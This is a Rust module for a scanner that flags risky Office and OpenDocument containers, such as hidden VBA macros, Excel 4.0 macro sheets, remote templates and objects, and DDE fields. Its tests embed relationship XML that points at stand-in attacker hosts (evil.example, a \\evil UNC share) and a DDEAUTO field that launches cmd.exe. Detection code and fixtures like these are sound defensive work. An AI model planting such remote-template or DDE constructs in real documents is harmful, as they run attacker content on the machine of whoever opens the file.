//! Office Open XML (`.docx`, `.xlsx`, `.pptx` and their macro-enabled and
//! template siblings) and OpenDocument: a zip whose table of contents and a
//! few small parts say what the document carries. Macros in a format meant
//! to carry none, Excel 4.0 macro sheets, OLE objects, ActiveX, templates
//! and objects fetched from a remote host on open, and DDE fields.

use super::zip::Zip;
use super::{Doc, find, push};

const MACRO_ENABLED: &[&str] = &["docm", "dotm", "xlsm", "xltm", "xlam", "pptm", "potm", "ppam", "ppsm"];
/// The parts where a DDE field would be written.
const MAIN_PARTS: [&str; 3] = ["word/document.xml", "xl/workbook.xml", "ppt/presentation.xml"];
/// Relationship files read, at most, for remote targets.
const MAX_RELS: usize = 60;
/// How much of a remote URL a note shows.
const URL_SHOWN: usize = 80;
/// How many of a list of part names a note shows.
const NAMES_SHOWN: usize = 3;

/// What the zip's table of contents and a few small parts say.
pub(super) fn scan(file: &str, ext: &str, bytes: &[u8], out: &mut Vec<Doc>) {
    let Some(zip) = Zip::parse(bytes) else {
        push(out, file, "DOC-UNREADABLE", "the zip container can't be read (zip64, damaged or encrypted)", false);
        return;
    };
    let names: Vec<&str> = zip.entries.iter().map(|e| e.name.as_str()).collect();
    let lower: Vec<String> = names.iter().map(|n| n.to_ascii_lowercase()).collect();
    let has = |suffix: &str| lower.iter().any(|n| n.ends_with(suffix));
    let any = |part: &str| lower.iter().any(|n| n.contains(part));
    let macro_enabled = MACRO_ENABLED.contains(&ext);
    let content_types =
        zip.read(bytes, "[Content_Types].xml").map(|b| String::from_utf8_lossy(&b).to_ascii_lowercase());
    let macro_type = content_types.as_deref().is_some_and(|c| c.contains("macroenabled"));
    if has("vbaproject.bin") || any("/vbaproject") || any("/vbadata.xml") {
        if macro_enabled {
            push(out, file, "DOC-MACRO", "VBA macros (vbaProject.bin): code that runs when macros are enabled", false);
        } else {
            push(
                out,
                file,
                "DOC-MACRO",
                format!("VBA macros in a .{ext}, a format meant to carry none: the macro-enabled extension is hidden"),
                true,
            );
        }
    } else if macro_type && !macro_enabled {
        push(
            out,
            file,
            "DOC-MACRO",
            format!("declared macro-enabled inside but named .{ext}: the extension hides what it is"),
            true,
        );
    }
    if any("xl/macrosheets/") || any("xl/intlmacrosheets/") {
        push(
            out,
            file,
            "DOC-XL4-MACRO",
            "Excel 4.0 macro sheets: the macro format malware moved to when VBA got blocked",
            true,
        );
    }
    let ole: Vec<&str> = names.iter().copied().filter(|n| n.to_ascii_lowercase().contains("oleobject")).collect();
    if !ole.is_empty() {
        push(
            out,
            file,
            "DOC-OLE-OBJECT",
            format!(
                "{} embedded OLE object(s) ({}): another file or program packaged inside",
                ole.len(),
                short_list(&ole)
            ),
            false,
        );
    }
    if any("/activex/") {
        push(out, file, "DOC-ACTIVEX", "ActiveX controls: native code the document can drive", false);
    }
    let remote = remote_targets(&zip, bytes, &names);
    if let Some(t) = remote.template {
        push(
            out,
            file,
            "DOC-REMOTE-TEMPLATE",
            format!(
                "the document loads its template from {}: whatever is there (macros included) arrives when it opens",
                short_url(&t)
            ),
            true,
        );
    }
    if let Some(t) = remote.object {
        push(
            out,
            file,
            "DOC-REMOTE-OBJECT",
            format!(
                "an embedded object is fetched from {}: the content arrives when it opens (the CVE-2017-0199 shape)",
                short_url(&t)
            ),
            true,
        );
    }
    if let Some(t) = remote.other {
        push(
            out,
            file,
            "DOC-REMOTE-CONTENT",
            format!("content loaded from {} when the document opens", short_url(&t)),
            false,
        );
    }
    if MAIN_PARTS.iter().any(|part| zip.read(bytes, part).is_some_and(|body| has_dde_field(&body))) {
        push(
            out,
            file,
            "DOC-DDE",
            "a DDE field: the document asks Office to run another program's command when it opens",
            true,
        );
    }
    if let Some(body) = zip.read(bytes, "xl/externalLinks/externalLink1.xml")
        && find(&body, b"<ddeLink").is_some()
    {
        push(out, file, "DOC-DDE", "a DDE link in the workbook's external links", true);
    }
}

/// The first remote target of each kind in the document's relationships.
#[derive(Default)]
struct Remote {
    template: Option<String>,
    object: Option<String>,
    other: Option<String>,
}

/// Relationships whose target is on another host: a template or object
/// fetched from elsewhere when the document opens. A template or object on
/// the author's own disk (`file:///C:/…`) is how Word works, and a
/// hyperlink is a link the reader has to click.
fn remote_targets(zip: &Zip, bytes: &[u8], names: &[&str]) -> Remote {
    let mut remote = Remote::default();
    let rels = names.iter().copied().filter(|n| n.to_ascii_lowercase().ends_with(".rels")).take(MAX_RELS);
    for r in rels {
        let Some(body) = zip.read(bytes, r) else { continue };
        let text = String::from_utf8_lossy(&body);
        for rel in text.split("<Relationship ").skip(1) {
            let tag = rel.split('>').next().unwrap_or("");
            if !tag.contains("TargetMode=\"External\"") && !tag.contains("TargetMode='External'") {
                continue;
            }
            let ty = attr(tag, "Type").unwrap_or("");
            let target = attr(tag, "Target").unwrap_or("");
            if !is_remote(target) {
                continue;
            }
            if ty.ends_with("/attachedTemplate") || ty.ends_with("/glossaryDocument") {
                remote.template.get_or_insert(target.to_string());
            } else if ty.ends_with("/oleObject")
                || ty.ends_with("/package")
                || ty.ends_with("/frame")
                || ty.ends_with("/subDocument")
            {
                remote.object.get_or_insert(target.to_string());
            } else if !ty.ends_with("/hyperlink") {
                remote.other.get_or_insert(target.to_string());
            }
        }
    }
    remote
}

/// A target on another machine: a web URL, a UNC path, FTP, or a
/// `file://host/…` URL with a host.
fn is_remote(target: &str) -> bool {
    target.starts_with("http://")
        || target.starts_with("https://")
        || target.starts_with("\\\\")
        || target.starts_with("ftp://")
        || (target.starts_with("file://") && !target.starts_with("file:///"))
}

/// A DDE field in a main part: `DDEAUTO`, a `DDE` instruction, or a
/// `<ddeLink>`.
fn has_dde_field(body: &[u8]) -> bool {
    find(body, b"DDEAUTO").is_some()
        || find(body, b">DDE ").is_some()
        || find(body, b"instr=\"DDE").is_some()
        || find(body, b"<ddeLink").is_some()
        || find(body, b"instr=\" DDE").is_some()
}

/// The value of a quoted XML attribute in one tag.
fn attr<'a>(tag: &'a str, name: &str) -> Option<&'a str> {
    let i = tag.find(&format!("{name}="))?;
    let v = &tag[i + name.len() + 1..];
    let q = v.chars().next()?;
    if q == '"' || q == '\'' { v[1..].split(q).next() } else { None }
}

fn short_list(names: &[&str]) -> String {
    let shown: Vec<&str> = names.iter().take(NAMES_SHOWN).map(|n| n.rsplit('/').next().unwrap_or(n)).collect();
    format!("{}{}", shown.join(", "), if names.len() > NAMES_SHOWN { ", …" } else { "" })
}

fn short_url(u: &str) -> String {
    let one: String = u.chars().take(URL_SHOWN).collect();
    if u.chars().count() > URL_SHOWN { format!("{one}…") } else { one }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::documents::zip::{Member, build, stored};
    use crate::documents::{ids, scan_bytes};

    const TYPES: &[u8] = br#"<Types><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>"#;
    const TEMPLATE_RELS: &[u8] = br#"<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com" TargetMode="External"/></Relationships>"#;

    #[test]
    fn a_clean_document_is_nothing() {
        let clean = stored(&[("[Content_Types].xml", TYPES), ("word/document.xml", b"<w:document/>")]);
        assert!(scan_bytes("letter.docx", &clean).is_empty());
        assert!(scan_bytes("sheet.ods", &clean).is_empty(), "OpenDocument goes the same way");
    }

    #[test]
    fn macros_fail_where_the_format_hides_them_and_warn_where_it_says_so() {
        let macros = stored(&[
            ("[Content_Types].xml", TYPES),
            ("word/vbaProject.bin", b"\x01vba"),
            ("word/document.xml", b"<w:document/>"),
        ]);
        assert_eq!(ids(&scan_bytes("letter.docx", &macros)), [("DOC-MACRO", true)], "macros in a .docx fail");
        assert_eq!(ids(&scan_bytes("letter.docm", &macros)), [("DOC-MACRO", false)], "macros in a .docm warn");
        let declared = stored(&[(
            "[Content_Types].xml",
            br#"<Types><Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/></Types>"#,
        )]);
        let got = scan_bytes("letter.docx", &declared);
        assert_eq!(ids(&got), [("DOC-MACRO", true)], "declared macro-enabled but named .docx");
        assert!(got[0].note.contains("declared macro-enabled"), "{}", got[0].note);
        assert!(scan_bytes("letter.docm", &declared).is_empty(), "declared and named the same");
        let xl4 = stored(&[("xl/workbook.xml", b"<workbook/>"), ("xl/macrosheets/sheet1.xml", b"<macrosheet/>")]);
        assert_eq!(ids(&scan_bytes("q.xlsx", &xl4)), [("DOC-XL4-MACRO", true)]);
    }

    #[test]
    fn remote_templates_and_objects_fail_while_local_ones_and_links_are_ignored() {
        let remote =
            stored(&[("word/_rels/settings.xml.rels", TEMPLATE_RELS), ("word/settings.xml", b"<w:settings/>")]);
        let got = scan_bytes("letter.docx", &remote);
        assert_eq!(ids(&got), [("DOC-REMOTE-TEMPLATE", true)]);
        assert!(got[0].note.contains("evil.example"), "{}", got[0].note);
        let local = br#"<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file:///C:\Users\me\Templates\Normal.dotm" TargetMode="External"/></Relationships>"#;
        assert!(
            scan_bytes("letter.docx", &stored(&[("word/_rels/settings.xml.rels", local)])).is_empty(),
            "a template on the author's own disk is how Word works"
        );
        let object = br#"<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="http://evil.example/x.sct" TargetMode="External"/></Relationships>"#;
        let got = scan_bytes("letter.docx", &stored(&[("word/_rels/document.xml.rels", object)]));
        assert_eq!(ids(&got), [("DOC-REMOTE-OBJECT", true)]);
        let unc = br#"<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="\\evil\share\a.png" TargetMode="External"/></Relationships>"#;
        let got = scan_bytes("letter.docx", &stored(&[("word/_rels/document.xml.rels", unc)]));
        assert_eq!(ids(&got), [("DOC-REMOTE-CONTENT", false)], "a UNC image is content, not a template");
        let internal = br#"<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/t.dotm"/></Relationships>"#;
        assert!(
            scan_bytes("letter.docx", &stored(&[("word/_rels/settings.xml.rels", internal)])).is_empty(),
            "without TargetMode=External the target is a part name"
        );
    }

    #[test]
    fn a_deflated_rels_part_is_read_through_the_inflater() {
        // TEMPLATE_RELS' first relationship alone, as zlib writes it raw.
        let deflated: &[u8] = &[
            0x55, 0x8e, 0xb1, 0x0e, 0x83, 0x30, 0x0c, 0x44, 0x7f, 0x05, 0xe5, 0x03, 0x30, 0xed, 0xd0, 0xa1, 0x02, 0xa6,
            0x76, 0x60, 0x60, 0xa9, 0xf8, 0x01, 0x8b, 0x18, 0x88, 0x94, 0xc4, 0x51, 0xe2, 0x56, 0xf4, 0xef, 0x6b, 0xa9,
            0xaa, 0x44, 0xc7, 0x3b, 0xdf, 0x3d, 0x5f, 0xfb, 0x20, 0x8f, 0xe2, 0x38, 0x96, 0xcd, 0xa5, 0xd2, 0xb7, 0x47,
            0x59, 0x0d, 0xb6, 0x33, 0x79, 0xb0, 0x27, 0x53, 0x4d, 0xef, 0x44, 0x9d, 0xd9, 0x44, 0xd2, 0x15, 0xa0, 0xcc,
            0x1b, 0x05, 0x2c, 0x35, 0x27, 0x8a, 0x7b, 0xf0, 0x0b, 0xe7, 0x80, 0xa2, 0x32, 0xaf, 0xc0, 0xcb, 0xe2, 0x66,
            0xba, 0xf1, 0xfc, 0x0c, 0x14, 0x05, 0xce, 0x4d, 0x73, 0x81, 0x7c, 0xfc, 0x00, 0x28, 0x82, 0xda, 0xb7, 0x13,
            0x85, 0xa4, 0x3e, 0x29, 0x1b, 0xf3, 0x4a, 0xf2, 0xa5, 0x17, 0xc5, 0xd3, 0xcb, 0xf9, 0x9a, 0x76, 0xd4, 0x3b,
            0x81, 0xd4, 0x96, 0x25, 0xfc, 0x42, 0x23, 0x5b, 0x9d, 0x71, 0xdf, 0x85, 0x72, 0x44, 0x6f, 0xa0, 0x6f, 0xe1,
            0x7f, 0xff, 0x07,
        ];
        let zip = build(&[Member {
            name: "word/_rels/settings.xml.rels",
            method: 8,
            flags: 0,
            data: deflated,
            uncompressed: 207,
        }]);
        let got = scan_bytes("letter.docx", &zip);
        assert_eq!(ids(&got), [("DOC-REMOTE-TEMPLATE", true)], "{got:?}");
        assert!(got[0].note.contains("evil.example"), "{}", got[0].note);
    }

    #[test]
    fn dde_ole_and_activex() {
        let dde = stored(&[("word/document.xml", br#"<w:document><w:instrText>DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"</w:instrText></w:document>"#)]);
        assert_eq!(ids(&scan_bytes("letter.docx", &dde)), [("DOC-DDE", true)]);
        let dde_link = stored(&[(
            "xl/externalLinks/externalLink1.xml",
            b"<externalLink><ddeLink ddeService=\"cmd\"/></externalLink>",
        )]);
        let got = scan_bytes("q.xlsx", &dde_link);
        assert_eq!(ids(&got), [("DOC-DDE", true)]);
        assert!(got[0].note.contains("external links"), "{}", got[0].note);
        let ole_obj =
            stored(&[("word/embeddings/oleObject1.bin", b"\xd0\xcf\x11\xe0"), ("word/document.xml", b"<w:document/>")]);
        let got = scan_bytes("letter.docx", &ole_obj);
        assert_eq!(ids(&got), [("DOC-OLE-OBJECT", false)]);
        assert!(got[0].note.contains("1 embedded OLE object(s) (oleObject1.bin)"), "{}", got[0].note);
        let activex = stored(&[("word/activeX/activeX1.xml", b"<ax:ocx/>")]);
        assert_eq!(ids(&scan_bytes("letter.docx", &activex)), [("DOC-ACTIVEX", false)]);
    }

    #[test]
    fn a_zip_that_cannot_be_read_is_unreadable() {
        let mut zip64 = stored(&[("word/document.xml", b"<w:document/>")]);
        let eocd = zip64.len() - 22;
        zip64[eocd + 16..eocd + 20].copy_from_slice(&0xFFFF_FFFFu32.to_le_bytes());
        let got = scan_bytes("letter.docx", &zip64);
        assert_eq!(ids(&got), [("DOC-UNREADABLE", false)]);
        assert!(got[0].note.contains("zip64, damaged or encrypted"), "{}", got[0].note);
    }

    #[test]
    fn helpers() {
        assert_eq!(attr(r#"Relationship Id="rId1" Target='a b'"#, "Target"), Some("a b"));
        assert_eq!(attr(r#"Relationship Id="rId1""#, "Target"), None);
        assert_eq!(attr(r#"Target=unquoted"#, "Target"), None);
        assert_eq!(short_list(&["a/b/one.bin", "two.bin", "three.bin", "four.bin"]), "one.bin, two.bin, three.bin, …");
        let long = format!("https://evil.example/{}", "x".repeat(100));
        assert_eq!(short_url(&long).chars().count(), 81, "80 characters and an ellipsis");
        assert_eq!(short_url("https://a.b/c"), "https://a.b/c");
        assert!(is_remote("file://server/share/t.dotm"));
        assert!(!is_remote("file:///C:/Users/me/t.dotm"));
        assert!(!is_remote("word/media/image1.png"));
    }
}
